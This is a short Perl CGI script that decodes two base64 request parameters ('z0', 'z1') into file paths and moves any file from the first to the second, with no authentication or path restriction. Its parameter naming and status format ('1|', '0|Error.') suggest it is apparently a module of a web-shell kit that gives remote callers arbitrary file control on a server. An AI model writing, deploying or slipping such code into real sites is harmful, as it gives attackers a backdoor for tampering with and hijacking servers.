use strict;
use warnings;
use CGI;
use MIME::Base64;
use File::Copy qw(move);

sub main {
    my $q = CGI->new;
    my $z0 = $q->param('z0') // '';
    my $z1 = $q->param('z1') // '';

    my $src_path = decode_base64($z0);
    my $dst_path = decode_base64($z1);

    if (-e $dst_path) {
        print "0|Destination already exists.";
        return;
    }

    if (move($src_path, $dst_path)) {
        print "1|";
    } else {
        print "0|Error.";
    }
}

main();